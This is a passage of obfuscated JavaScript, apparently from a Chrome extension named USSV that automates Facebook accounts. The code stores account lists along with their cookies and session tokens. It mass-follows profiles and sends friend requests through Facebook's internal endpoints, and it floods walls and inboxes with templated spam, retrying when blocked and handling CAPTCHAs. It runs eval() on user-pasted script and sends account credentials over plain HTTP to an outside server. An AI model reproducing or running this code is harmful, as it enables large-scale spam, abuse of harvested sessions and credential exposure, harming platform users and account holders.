                } else {
                    Cookie = "";
                }
                if (f1W[V](Cookie[f1W.x3y]("Cookie"), null)) {
                    Cookie = "|" + Cookie;
                } else {
                    Cookie = "";
                }
                if (f1W[W](U, F - 1)) {
                    o = o + M + "|" + b + Cookie;
                } else {
                    o = o + M + "|" + b + Cookie + "\n";
                }
            }
            $("#data_list_acc_coban")[f1W.o07](o[f1W.F6r](/\r\n|\r/gi, "")[f1W.F6r](/\n\|/gi, "")[f1W.F6r](/undefined/gi, ""));
            $("#uss_st_coban_total_acc")[f1W.m8y](F);
            $("#AccList_TK_None")[f1W.m8y](F);
        };
        this[Y4] = function(W) {
            var V = "#AccList_TK_";
            Now = parseInt($(V + W)[f1W.m8y]());
            $(V + W)[f1W.m8y](Now + f1W.S9a);
        };
        this[R0] = function(O) {
            var Z = "#sl_CheckSave_AccList_Every_Time",
                F = "_Token",
                o = "_Kxd",
                U = "_Live",
                p = "#sl_CheckSave_AccList_Every_Time_Note",
                M = "_None",
                b = "s1a",
                H = new Date();
            if (f1W[b](O[f1W.S77], f1W.L9a)) {
                var R = setInterval(function() {
                    var W = "Save1",
                        V = "#sl_CheckSave_AccList_Every",
                        E = "m1a";
                    if (f1W[E]($(V)[f1W.o07](), f1W.S9a)) {
                        uss[f1W.G6a]({
                            "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + M,
                            "Content": $(I4)[f1W.o07](),
                            "Note": p,
                            "SaveTime": f1W.S9a
                        });
                        uss[f1W.G6a]({
                            "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + U,
                            "Content": $(a4)[f1W.o07](),
                            "Note": p,
                            "SaveTime": f1W.S9a
                        });
                        uss[f1W.G6a]({
                            "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + o,
                            "Content": $(H4)[f1W.o07](),
                            "Note": p,
                            "SaveTime": f1W.S9a
                        });
                        uss[f1W.G6a]({
                            "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + F,
                            "Content": $(f1W.L5X)[f1W.o07](),
                            "Note": p,
                            "SaveTime": f1W.S9a
                        });
                    } else {
                        $(p)[f1W.Q0I](_lJ[f1W.G3v]({
                            "t": f1W.J9I,
                            "id": W
                        }));
                        clearInterval(R);
                    }
                }, $(Z)[f1W.o07]());
            } else {
                uss[f1W.G6a]({
                    "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + M,
                    "Content": $(I4)[f1W.o07](),
                    "Note": p,
                    "SaveTime": f1W.S9a
                });
                uss[f1W.G6a]({
                    "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + U,
                    "Content": $(a4)[f1W.o07](),
                    "Note": p,
                    "SaveTime": f1W.S9a
                });
                uss[f1W.G6a]({
                    "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + o,
                    "Content": $(H4)[f1W.o07](),
                    "Note": p,
                    "SaveTime": f1W.S9a
                });
                uss[f1W.G6a]({
                    "Name": uss_aut(f1W.S9a) + f1W.S1v + uss_aut(f1W.c9a) + f1W.S1v + H[f1W.t9Y]() + F,
                    "Content": $(f1W.L5X)[f1W.o07](),
                    "Note": p,
                    "SaveTime": f1W.S9a
                });
            }
        };
    }

    function fc_add_dv(W) {
        var V = '<div class="div_msg_sf_title">Ch? Ð? An Toàn</div>',
            E = "O36",
            O = f1W.X6v;
        if (f1W[E](W, f1W.e10)) {
            var O = V;
        }
        return O;
    }

    function _sf() {
        this[f1W.j2X] = f1W.V8v;
        this[f1W.O4y] = f1W.C27;
        this[f1W.m8y] = f1W.V8v;
        this[f1W.O00] = get_Fb_Key();
        this[f1W.C27] = function(F, o) {
            var o = o[f1W.X3Q](f1W.w30);
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: this[f1W.j2X],
                data: "base=hau"
            }, function(W) {
                var V = "X56",
                    E = "y56",
                    O = "F56";
                if (f1W[O](F, 1)) {
                    var W = JSON[f1W.i2O](W);
                    W = o[0] + "|||" + o[1] + "|||" + W.data;
                    _sf[f1W.h0r](W);
                } else if (f1W[E](F, 2)) {
                    var W = JSON[f1W.i2O](W),
                        Z = W.data;
                    if (f1W[V](Z, null)) {
                        Z = _2l(name_friend, 2);
                    }
                    $("." + o[0])[f1W.Q0I](Z);
                }
            });
        };
        this[f1W.a7I] = function(W) {
            var V = "k56";
            if (f1W[V](uss_aut(f1W.S9a, f1W.S9a), f1W.c8Q)) {
                return f1W.o0Y + uss_aut(f1W.S9a, f1W.S9a) + f1W.R87 + uss_aut(f1W.c9a, f1W.S9a);
            }
        };
        this[f1W.h0r] = function(W) {
            W = W[f1W.X3Q](f1W.Q8O);
            fb_Msg(f1W.L9a, f1W.S9a, f1W.S9a, W[f1W.L9a] + f1W.U7v + W[f1W.c9a], f1W.L9a, this[f1W.O00], get_Fb_Uid());
        };
    }

    function fb_Sub(F, o, U, p, M, b) {
        var H = "W76",
            R = "S96";
        if (f1W[R](F, f1W.S9a)) {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/follow/follow_profile.php",
                dataType: "json",
                type: "POST",
                data: "fb_dtsg=" + M + "&profile_id=" + U + "&location=5&feed_blacklist_action=show_followee_on_follow&__user=" + b + "&__a=1&__req=3d"
            })[f1W.D2I](function(W) {
                var V = "d96",
                    E = "K96",
                    O = "L96";
                if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v],
                        W = W[f1W.F6r]("for (;;);", ""),
                        Z = W[f1W.x3y](U);
                    if (f1W[V](Z, null)) {
                        dom_logs_ussv(o + " dã theo gi?i " + U + " tru?c dó ", "0|0|_|war|subs");
                    } else {
                        dom_logs_ussv(o + " Theo gi?i " + U + " thành công", "0|0|_|ok|subs");
                    }
                } else {
                    dom_logs_ussv("Theo gi?i " + U + " Th?t bai !", "0|0|_|erros|subs");
                }
            });
        } else if (f1W[H](F, f1W.c9a)) {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/add_friend/action.php",
                dataType: "json",
                type: "POST",
                data: "to_friend=" + U + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + b + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + M + "&phstamp="
            })[f1W.D2I](function(W) {
                var V = "r76",
                    E = "E76";
                if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v],
                        W = W[f1W.F6r]("for (;;);", ""),
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        dom_logs_ussv(o + " Theo gi?i " + U + " thành công", "0|0|_|ok|subs");
                    } else {
                        dom_logs_ussv(o + " Theo gi?i " + U + " thành công", "0|0|_|ok|subs");
                    }
                } else {
                    dom_logs_ussv("Theo gi?i " + U + " Th?t bai !", "0|0|_|erros|subs");
                }
            });
        } else {}
    }

    function get_mysub(O, Z, F, o, U) {
        var p = f1W.G8y + o;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: p,
            data: "hj=hj"
        }, function(W) {
            var V = "b6b",
                W = JSON[f1W.i2O](W);
            if (f1W[V](W[f1W.I7r], undefined)) {
                var E = 0;
            } else {
                var E = W[f1W.I7r][f1W.u6X];
            }
            add_info(O, Z, F, U, E, o);
        });
    }

    function create_url_login_ussv() {
        var Z = "B?n chua dang nh?p vào USSV",
            F = "k7t";
        if (f1W[F](uss_aut(f1W.S9a), f1W.L9a)) {
            $(f1W.W2Y)[f1W.Q0I](Z);
        } else {
            var o = uss_aut(f1W.S9a) + f1W.w30 + uss_aut(f1W.c9a);
            chrome[f1W.d60][f1W.K4r]({
                method: 'POST',
                action: 'xhttp',
                url: 'http://ussv.net/ajax/mahoa.php?type=1&method=1&data=' + o,
                data: "base=hau"
            }, function(W) {
                var V = "m7t",
                    E = "s7t",
                    W = JSON[f1W.i2O](W);
                if (f1W[E](W[f1W.C3y], 0)) {
                    if (f1W[V](W.data, null)) {
                        var O = W.data;
                        $("#url_login_ussv")[f1W.o07]("https://www.facebook.com/?usslogin=" + O);
                        $(".setting.btn.btn_go_UrlLogin, .setting.btn.btn_save_UrlLogin")[f1W.R4r]();
                    } else {
                        $(".setting_note_bottom")[f1W.Q0I]("D? li?u truy c?p nhanh không h?p l? !");
                    }
                } else {}
                $(".setting_note_bottom")[f1W.Q0I](W[f1W.F5v]);
            });
        }
    }

    function _fb_data() {
        var X4 = "img_scrape",
            k4 = "list",
            R4 = "rand_num",
            y4 = "for_send_msg",
            s4 = "total",
            h4 = "facebook",
            H4 = "n8l";
        if (f1W[H4](_op_page[f1W.j2X](h4), f1W.L9a)) {
            this[f1W.M00] = f1W.V8v;
        } else {
            this[f1W.M00] = f1W.L9a;
        }
        this[f1W.l97] = f1W.V8v;
        this[s4] = f1W.L9a;
        this[y4] = function I4(W, V, E) {
            var O = "c8l",
                Z = "J8l",
                F = "I8l",
                o = "T8l",
                U = "a8l",
                p = "i8l";
            if (f1W[p]($("#stt_check")[f1W.Q0I](), "1")) {} else {
                if (f1W[U](this[f1W.l97][f1W.x3y]("\n"), null)) {
                    E = this[f1W.l97][f1W.X3Q](",");
                    Split = "|||";
                } else {
                    E = this[f1W.l97][f1W.X3Q]("\n");
                    Split = "|";
                }
                if (f1W[o]($("#ussv_post_AU_QD")[f1W.m8y](), "No")) {
                    note = _2l("x", 8);
                    $("#div_panel_post_note_span")[f1W.Q0I](note);
                    _fb_data[f1W.C67](note, "fn");
                } else {
                    if (f1W[F](V, E.length - 1)) {
                        $(".img_waiting_post")[f1W.v37]();
                        $(".btn_type_post.start")[f1W.R4r]();
                        $(".btn_type_post.stop")[f1W.v37]();
                        note = _2l("" + E.length, 3);
                        $("#div_panel_post_note_span")[f1W.Q0I](note);
                        _fb_data[f1W.C67](note, "fn");
                    } else {
                        var V = V + 1,
                            M = E[V];
                        if (f1W[Z](M, "") || f1W[O](M, undefined)) {
                            M = "0" + Split + "Khong Xac Dinh";
                        }
                        _fb_data[f1W.c2O](M, W, V);
                    }
                }
            }
        };
        this[f1W.c2O] = function e0(C0, T0, M0, I0, G0) {
            var L0 = "ImgType",
                B4 = "t3l",
                Z4 = "C3l",
                y0 = "g3l",
                p4 = "D3l",
                x0 = "y3l",
                A0 = "F3l",
                O0 = "B3l",
                D0 = "j3l",
                V4 = "A8l",
                z0 = "G8l",
                j4 = "v8l",
                S0 = "u8l";
            if (f1W[S0](this[f1W.l97][f1W.x3y]("\n"), null)) {
                if (f1W[j4](M0, 0)) {
                    h_split = "";
                } else {
                    h_split = ",";
                }
                Split = "|||";
            } else {
                if (f1W[z0](M0, 0)) {
                    h_split = "";
                } else {
                    h_split = "\n";
                }
                Split = "|";
            }
            type = $("#ussv_sl_type_post")[f1W.o07]();
            if (f1W[V4](C0[f1W.O4y], "inbox")) {
                js = C0;
                type = "inbox";
                T0 = js[f1W.B20];
                M0 = 0;
                C0 = js[f1W.l97] + Split + js[f1W.G6y];
                if (f1W[D0](js[f1W.U4v], undefined) || f1W[O0](js[f1W.U4v], null)) {
                    js[f1W.U4v] = " _";
                }
            } else {
                js = {};
            }
            uid_name = C0[f1W.X3Q](Split);
            var a0 = uid_name[0],
                c0 = uid_name[1];
            w0 = T0[f1W.X3Q]("|USSV|");
            w0 = w0[_fb_data[R4](w0.length)];
            w0 = w0[f1W.F6r](/USSVNAME/g, c0);
            w0 = w0[f1W.F6r](/USSVTAGNAME/g, '%40[' + a0 + '%3A' + c0 + ']');
            var w0 = w0[f1W.F6r](/\n/g, "%0A"),
                w0 = w0[f1W.F6r](/&/g, "%26");
            total_er_span = $("#ussv_post_TK_TB");
            total_fn_span = $("#ussv_post_TK_TC");
            Fb_Uid = _fb[f1W.z1Y];
            Fb_Key = _fb[f1W.O00];
            var b4 = Date[f1W.t5v] || function() {
                return +new Date;
            };
            if (f1W[A0](type, "wall")) {
                SendIMG = $("#ussv_post_img")[f1W.o07]();
                if (f1W[x0](a0, "0")) {
                    $[f1W.r70]('https://graph.facebook.com/' + a0 + '/photos?url=' + SendIMG + '&message=' + w0 + '&method=POST&access_token=' + _fb_data[f1W.M00], function() {})[f1W.X5v](function(W) {
                        var V = "s3l",
                            E = "k3l",
                            O = "X3l";
                        if (f1W[O](W[f1W.S7Y], null)) {
                            post_id = W[f1W.G2r][f1W.X3Q]("_");
                            var Z = _2l(a0 + "(" + c0 + ")" + "|" + post_id[0] + "|" + post_id[1], 7);
                            $("#div_panel_post_note_span")[f1W.Q0I](Z);
                            $(".div_row_fr_list." + a0)[f1W.X5O]("fn");
                            _fb_data[f1W.C67](Z);
                            total_fn = parseInt(total_fn_span[f1W.m8y]());
                            total_fn_span[f1W.m8y](total_fn + 1);
                            F = $(".list_uid_will_post");
                            if (f1W[E](M0, 0)) {
                                h_split = "";
                            } else {
                                h_split = ",";
                            }
                            if (f1W[V](c0, undefined)) {
                                h_right = "";
                            } else {
                                h_right = Split + c0;
                            }
                            list_replace = h_split + a0 + h_right;
                            var F = F[f1W.o07]()[f1W.F6r](list_replace, "");
                            $(".list_uid_will_post")[f1W.o07](F);
                            _fb_data[y4](T0, M0);
                        }
                    })[f1W.H4I](function(W, V) {
                        var E = "Y3l",
                            O = "m3l",
                            Z = JSON[f1W.i2O](W[f1W.H8v]);
                        if (f1W[O](W[f1W.p0O], 500)) {
                            var F = "USS Ca?nh Ba´o: B?n Ða~ SPAM vo´i tô´c dô? a´nh sa´ng lên tuo`ng nha` " + c0 + " (" + a0 + "). Facebook da~ ngan cha?n ha`nh dô?ng na`y. \n USSV Ma~ Lô~i :" + W[f1W.p0O];
                        } else if (f1W[E](W[f1W.p0O], 400)) {
                            F = "L?i không xác d?nh : 400<br/>Tin nh?n: " + Z.error[f1W.q10];
                        } else {
                            var F = "USS Ca?nh Ba´o: B?n không co´ quyê`n Ðang Ba`i lên Tuo`ng nhà " + c0 + " (" + a0 + ") \n USSV Ma~ Lô~i :" + W[f1W.p0O];
                        }
                        var o = F;
                        _fb_data[f1W.C67](o, "error");
                        $("#div_panel_post_note_span")[f1W.Q0I](o);
                        $(".div_row_fr_list." + a0)[f1W.X5O]("fn_error");
                        total_er = parseInt(total_er_span[f1W.m8y]());
                        total_er_span[f1W.m8y](total_er + 1);
                        var U = $(".list_uid_post_error")[f1W.Q0I]();
                        U += ',' + a0 + Split + c0;
                        $(".list_uid_post_error")[f1W.Q0I](U);
                        _fb_data[y4](T0, M0);
                    });
                } else {
                    _fb_data[y4](T0, M0);
                }
            } else if (f1W[p4](type, "inbox")) {
                if (f1W[y0]($("#stt_check")[f1W.Q0I](), "1") || f1W[Z4](acc_doing[f1W.f17], 1)) {
                    var q4 = 1,
                        e4 = "toi",
                        W4 = "you",
                        r4 = $("#text_string_spam")[f1W.o07](),
                        r4 = r4[f1W.F6r](/uss_xungho/gi, "uss.xungho");
                    eval(r4);
                    f4(0);
                    var n4 = js[k4].data.length;
                    acc_doing[f1W.w97] = n4;

                    function f4(W) {
                        var V = "w3l",
                            E = "x3l",
                            O = "l3l";
                        if (f1W[O](W, acc_doing[f1W.w97])) {
                            _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                "t": "spam",
                                "id": "b7",
                                "r": W + "---a"
                            }), "fn");
                            acc_doing[f1W.f17] = 0;
                        } else {
                            if (f1W[E]($("#spam_info_acc_can_spam_" + js[f1W.W7O])[f1W.o07](), 0)) {
                                acc_doing[f1W.f17] = 0;
                                _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                    "t": "spam",
                                    "id": "b10"
                                }), "error");
                            } else {
                                acc_doing[f1W.f17] = 1;
                                uid = js[k4].data[W][f1W.l97];
                                name = js[k4].data[W][f1W.G6y];
                                msg = Content(W, js[k4]);
                                W = W + 1;
                                if (f1W[V]($("#uss_st_spam_inbox_via")[f1W.o07](), "img")) {
                                    M4({
                                        "stt": W,
                                        "msg": msg,
                                        "uid": uid,
                                        "name": name
                                    });
                                } else {
                                    E4({
                                        "stt": W,
                                        "msg": msg,
                                        "uid": uid,
                                        "name": name
                                    });
                                }
                            }
                        }
                    };
                } else {
                    if (f1W[B4]($("#CorePost_Setting_inbox_sl_type")[f1W.o07](), 1)) {
                        M4({
                            "uid": a0,
                            "msg": w0,
                            "name": c0
                        });
                    } else {
                        E4({
                            "uid": a0,
                            "msg": w0,
                            "name": c0
                        });
                    }
                }

                function E4(U0) {
                    var b0 = "f6l",
                        s0 = "H6l",
                        V0 = "q6l",
                        i0 = "b6l",
                        J0 = "U6l",
                        f0 = "datas",
                        k0 = "Z6l",
                        N0 = "O6l",
                        l0 = "methods",
                        v0 = "V6l",
                        K0 = "Q3l";
                    if (f1W[K0](U0, undefined)) {
                        var P0 = U0[f1W.B20],
                            Y0 = U0[f1W.l97],
                            g0 = U0[f1W.G6y],
                            u0 = U0[f1W.F2O];
                    } else {
                        var P0 = P0,
                            Y0 = Y0,
                            g0 = g0;
                    }
                    var P0 = P0[f1W.F6r](/USSV-RANDOM-INT/gi, uss[f1W.K0v]({
                        "type": "int",
                        "lg": 12
                    }));
                    if (f1W[v0](js[l0], "imglink")) {
                        if (f1W[N0](u0, undefined)) {
                            datas = "message_batch[0][action_type]=ma-type:user-generated-message&message_batch[0][thread_id]=&message_batch[0][author]=fbid:" + Fb_Uid + "&message_batch[0][author_email]=&message_batch[0][coordinates]=&message_batch[0][timestamp]=" + b4() + "&message_batch[0][timestamp_absolute]=Hôm nay&message_batch[0][timestamp_relative]=" + displayTime() + "&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]=source:chat:web&message_batch[0][source_tags][0]=source:chat&message_batch[0][body]=" + P0 + "&message_batch[0][m_sess]=&message_batch[0][has_attachment]=true&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid:" + Y0 + "&message_batch[0][specific_to_list][1]=fbid:" + Fb_Uid + "&message_batch[0][content_attachment][subject]=&message_batch[0][content_attachment][app_id]=2309869772&message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=" + js[f1W.X0Q] + "&message_batch[0][content_attachment][attachment][params][urlInfo][final]=" + js[f1W.X0Q] + "&message_batch[0][content_attachment][attachment][params][urlInfo][user]=" + js[f1W.X0Q] + "&message_batch[0][content_attachment][attachment][params][images][0]=" + js[f1W.S9y] + "&message_batch[0][content_attachment][attachment][params][medium]=101&message_batch[0][content_attachment][attachment][params][url]=" + js[f1W.X0Q] + "&message_batch[0][content_attachment][attachment][type]=100&message_batch[0][content_attachment][link_metrics][source]=ShareStageExternal&message_batch[0][content_attachment][link_metrics][domain]=facebook.com&message_batch[0][content_attachment][link_metrics][base_domain]=facebook.com&message_batch[0][content_attachment][attachment][params][title]=" + js[f1W.U4v] + "&message_batch[0][content_attachment][attachment][params][subtitle]=hjhj&message_batch[0][content_attachment][link_metrics][title_len]=11&message_batch[0][content_attachment][link_metrics][summary_len]=0&message_batch[0][content_attachment][link_metrics][min_dimensions][0]=70&message_batch[0][content_attachment][link_metrics][min_dimensions][1]=70&message_batch[0][content_attachment][link_metrics][images_with_dimensions]=1&message_batch[0][content_attachment][link_metrics][images_pending]=0&message_batch[0][content_attachment][link_metrics][images_fetched]=0&message_batch[0][content_attachment][link_metrics][image_dimensions][0]=1200&message_batch[0][content_attachment][link_metrics][image_dimensions][1]=800&message_batch[0][content_attachment][link_metrics][images_selected]=1&message_batch[0][content_attachment][link_metrics][images_considered]=1&message_batch[0][content_attachment][link_metrics][images_cap]=3&message_batch[0][content_attachment][link_metrics][images_type]=ranked&message_batch[0][content_attachment][composer_metrics][best_image_w]=100&message_batch[0][content_attachment][composer_metrics][best_image_h]=100&message_batch[0][content_attachment][composer_metrics][image_selected]=0&message_batch[0][content_attachment][composer_metrics][images_provided]=1&message_batch[0][content_attachment][composer_metrics][images_loaded]=1&message_batch[0][content_attachment][composer_metrics][images_shown]=1&message_batch[0][content_attachment][composer_metrics][load_duration]=1&message_batch[0][content_attachment][composer_metrics][timed_out]=0&message_batch[0][content_attachment][composer_metrics][sort_order]=&message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&message_batch[0][ui_push_phase]=Unknown&message_batch[0][status]=0&message_batch[0][message_id]=&message_batch[0][manual_retry_cnt]=0&&message_batch[0][client_thread_id]=user:" + Y0 + "&client=mercury&__user=" + Fb_Uid + "&__a=1&fb_dtsg=" + Fb_Key + "";
                        } else {
                            datas = u0;
                        }
                    } else if (f1W[k0](js[l0], "rs_imglink")) {
                        datas = js[f0];
                    } else {
                        if (f1W[J0](I0, undefined) || f1W[i0](I0, null)) {
                            if (f1W[V0](U0[f1W.i3a], null) || f1W[s0](U0[f1W.i3a], undefined)) {
                                datas = "message_batch[0][action_type]=ma-type:user-generated-message&message_batch[0][thread_id]&message_batch[0][author]=fbid:" + Fb_Uid + "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][timestamp]=" + b4() + "&message_batch[0][timestamp_absolute]=Hôm nay&message_batch[0][timestamp_relative]=" + displayTime() + "&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]=source:chat:web&message_batch[0][source_tags][0]=source:chat&message_batch[0][body]=" + P0 + "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid:" + Y0 + "&message_batch[0][specific_to_list][1]=fbid:" + Fb_Uid + "&message_batch[0][ui_push_phase]=V3&message_batch[0][sticker_id]:126362117548585&message_batch[0][status]=0&message_batch[0][message_id]=&message_batch[0][manual_retry_cnt]=0&&message_batch[0][client_thread_id]=user:" + Y0 + "&client=mercury&__user=" + Fb_Uid + "&__a=1&__req=18&fb_dtsg=" + Fb_Key + "";
                            } else {
                                if (f1W[b0](U0[L0], "gif")) {
                                    var m0 = "&message_batch[0][gif_ids][0]=" + U0[f1W.i3a];
                                } else {
                                    var m0 = "&message_batch[0][image_ids][0]=" + U0[f1W.i3a];
                                }
                                datas = "message_batch[0][action_type]=ma-type:user-generated-message&message_batch[0][thread_id]=&message_batch[0][author]=fbid:" + Fb_Uid + "&message_batch[0][author_email]=&message_batch[0][coordinates]=&message_batch[0][timestamp]=" + b4() + "&message_batch[0][timestamp_absolute]=Hôm nay&message_batch[0][timestamp_relative]=" + displayTime() + "&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]=source:chat:web&message_batch[0][source_tags][0]=source:chat&message_batch[0][body]=" + P0 + "&message_batch[0][has_attachment]=true&message_batch[0][html_body]=false&message_batch[0][specific_to_list][0]=fbid:" + Y0 + "&message_batch[0][specific_to_list][1]=fbid:" + Fb_Uid + "&message_batch[0][ui_push_phase]=V3&message_batch[0][content_attachment]=&message_batch[0][preview_attachments][0][upload_id]=upload_1024&message_batch[0][preview_attachments][0][on_progress]=function () { [native code] }&message_batch[0][preview_attachments][0][on_resizing_progress]=function () { [native code] }&message_batch[0][preview_attachments][0][on_success]=function () { [native code] }&message_batch[0][preview_attachments][0][upload_canceled]=function () { [native code] }&message_batch[0][preview_attachments][0][attach_type]=photo&message_batch[0][preview_attachments][0][preview_uploading]=true&message_batch[0][preview_attachments][0][preview_width]=80&message_batch[0][preview_attachments][0][preview_height]=80&message_batch[0][client_state]=send_to_server&message_batch[0][status]=7&message_batch[0][upload_id]=upload_1024&message_batch[0][message_id]=&message_batch[0][manual_retry_cnt]=0" + m0 + "&message_batch[0][client_thread_id]=user:" + Y0 + "&client=mercury&__user=" + Fb_Uid + "&__a=1&fb_dtsg=" + Fb_Key;
                            }
                        } else {
                            datas = I0;
                        }
                    }
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/mercury/send_messages.php",
                        dataType: "json",
                        type: "POST",
                        data: datas
                    })[f1W.D2I](function(b) {
                        var H = "m0E",
                            R = "s0E",
                            X = "k0E",
                            f = "X0E",
                            n = "y0E",
                            Y = "F0E",
                            N = "J5l",
                            g = "I5l",
                            T = "T5l",
                            I = "a5l",
                            D = "i5l",
                            G = "n5l",
                            C = "M5l",
                            z = "e5l",
                            P = "p5l",
                            J = "o5l",
                            c = "r5l",
                            L = "E5l",
                            E0 = "W5l",
                            F0 = "d6l",
                            K = "K6l",
                            r0 = "L6l",
                            Q = "S6l",
                            S = "P6l",
                            u = "z6l",
                            p0 = "N6l",
                            q0 = "h6l",
                            H0 = "R6l";
                        Checking = $("#stt_check")[f1W.Q0I]();
                        if (f1W[H0](b[f1W.D60], 4) && f1W[q0](b[f1W.p0O], 500)) {
                            var b = b[f1W.H8v],
                                b = b[f1W.F6r]("for (;;);", "");
                            b = JSON[f1W.i2O](b);
                            if (f1W[p0](b[f1W.S7Y], null)) {
                                IdMsg = b[f1W.v6v][f1W.M4I][0][f1W.z0r];
                                if (f1W[u](acc_doing[f1W.Y0v], 1) || f1W[S]($("#uss_st_spam_delmsg_inbox")[f1W.o07](), 1)) {
                                    fb_Msg(1, 1, Y0, IdMsg[f1W.F6r]("mid.", ""), 0, Fb_Key, Fb_Uid);
                                }
                                var W0 = _lJ[f1W.G3v]({
                                    "t": "spam",
                                    "id": "b1A",
                                    "r": Y0 + "--" + g0
                                });
                                _fb_data[f1W.C67](W0);
                                $("#div_panel_post_note_span")[f1W.Q0I](W0);
                                $(".div_row_fr_list." + Y0)[f1W.X5O]("fn");
                                total_fn = parseInt(total_fn_span[f1W.m8y]());
                                total_fn_span[f1W.m8y](total_fn + 1);
                                B0 = $(".list_uid_will_post");
                                if (f1W[Q](g0, undefined)) {
                                    h_right = "";
                                } else {
                                    h_right = Split + g0;
                                }
                                list_replace = h_split + Y0 + h_right;
                                if (f1W[r0](Checking, "1") || f1W[K](acc_doing[f1W.f17], 1)) {
                                    var w = parseInt($("#spaming_friends_" + js[f1W.W7O])[f1W.m8y]());
                                    w += 1;
                                    $("#spaming_friends_" + js[f1W.W7O])[f1W.m8y](w);
                                } else {
                                    var B0 = B0[f1W.o07]()[f1W.F6r](list_replace, "");
                                    $(".list_uid_will_post")[f1W.o07](B0);
                                }
                            } else {
                                if (f1W[F0](b.error, 1390008)) {
                                    I0 = datas + "&confirmed=1";
                                    if (f1W[E0](G0, "no")) {
                                        if (f1W[L](acc_doing[f1W.D4Q], 10)) {
                                            $("#ussv_post_AU_QD")[f1W.m8y]("No");
                                            _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                                "t": "spam",
                                                "id": "b6"
                                            }), "error");
                                        } else {
                                            acc_doing[f1W.D4Q] = acc_doing[f1W.D4Q] + 1;
                                            _fb_data[f1W.c2O](C0, T0, M0, I0, "no");
                                        }
                                    }
                                    _fb_data[f1W.C67](b[f1W.S7Y], "error");
                                } else if (f1W[c](b.error, 1357008)) {
                                    _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                        "t": "spam",
                                        "id": "b5"
                                    }), "error");
                                } else if (f1W[J](b.error, 1404114)) {
                                    _fb_data[f1W.C67](b[f1W.S7Y], "error");
                                    div_thongbao(_lJ[f1W.G3v]({
                                        "t": "spam",
                                        "id": "b8",
                                        "r": b[f1W.S7Y] + "--" + P0
                                    }));
                                    acc_doing[f1W.h6r] = 1;
                                } else if (f1W[P](b.error, 1404102)) {
                                    _fb_data[f1W.C67](b[f1W.S7Y], "error");
                                    div_thongbao(_lJ[f1W.G3v]({
                                        "t": "spam",
                                        "id": "b8",
                                        "r": b[f1W.S7Y] + "--" + P0
                                    }));
                                    acc_doing[f1W.h6r] = 1;
                                } else if (f1W[z](b.error, 1357001)) {
                                    $("#spam_info_acc_can_spam_" + js[f1W.W7O])[f1W.o07]("0")[f1W.V6Q]("selected", true);
                                    acc_doing[f1W.f17] = 0;
                                    _fb_data[f1W.C67](b[f1W.S7Y] + ". " + b[f1W.m87], "error");
                                } else if (f1W[C](b.error, 1545041)) {
                                    _fb_data[f1W.C67](b[f1W.S7Y] + ". " + b[f1W.m87], "error");
                                } else {
                                    $("#ussv_post_AU_QD")[f1W.m8y]("No");
                                    acc_doing[f1W.j97] = "yes";
                                    if (f1W[G](b[f1W.v6v][f1W.e3X], null)) {
                                        htmlcaptcha = b[f1W.v6v][f1W.e3X][f1W.y9X][0][1][f1W.a8Y];
                                    } else {
                                        htmlcaptcha = "<div>L?i</div>";
                                    }
                                    imgcaptcha = $(htmlcaptcha)[f1W.q8r](".img")[f1W.V6Q]("src");
                                    htmlcaptcha = htmlcaptcha[f1W.F6r]('class="img"', 'class="img captcha" id="imgcaptcha"');
                                    htmlcaptchaimg = $(htmlcaptcha)[f1W.q8r]("#captcha")[f1W.Q0I]();
                                    if (f1W[D](Checking, "1") || f1W[I](acc_doing[f1W.f17], 1)) {
                                        divCaptcha = "#ussv_logs_fb_captcha";
                                        SLAlertCaptcha = "#uss_st_spam_inbox_alertcaptcha";
                                        SLAutoCaptcha = "#uss_st_spam_inbox_autocaptcha";
                                        UsernamUss = uss_aut(1);
                                        UsernamPass = uss_aut(6);
                                    } else {
                                        divCaptcha = "#ussv_post_list_history_captcha";
